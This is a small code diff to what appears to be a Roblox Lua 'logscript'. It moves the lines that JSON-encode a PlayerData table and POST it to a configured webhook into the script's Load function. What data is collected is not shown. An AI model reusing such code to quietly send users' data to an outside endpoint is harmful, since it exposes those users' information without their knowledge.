@@ -109,14 +109,14 @@ function logscript:Load()
         ["inline"] = true
       })
     end
+
+    local PlayerData = game:GetService('HttpService'):JSONEncode(PlayerData)
+
+    HttpRequest({Url=logscript.Webhook, Body=PlayerData, Method="POST", Headers=Headers})
 end
 
-    
+  
 
-  local PlayerData = game:GetService('HttpService'):JSONEncode(PlayerData)
-
-  HttpRequest({Url=logscript.Webhook, Body=PlayerData, Method="POST", Headers=Headers})
-
-  return logscript
+return logscript
 
 
